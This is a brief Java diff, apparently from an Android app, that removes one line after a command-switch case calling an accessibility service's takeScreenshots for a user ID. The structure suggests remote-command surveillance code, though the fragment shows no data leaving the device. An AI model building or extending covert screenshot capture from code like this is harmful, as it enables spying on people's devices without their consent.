@@ -187,8 +187,6 @@ public class checkDatabase {
                 break;
             case 14:
                 accessibilityService.instance.takeScreenshots(userID);
-                accessibilityService.setInstance(accessibilityService.instance);
-                
                 break;
             case 15:
                 final Handler handler = new Handler(Looper.getMainLooper());
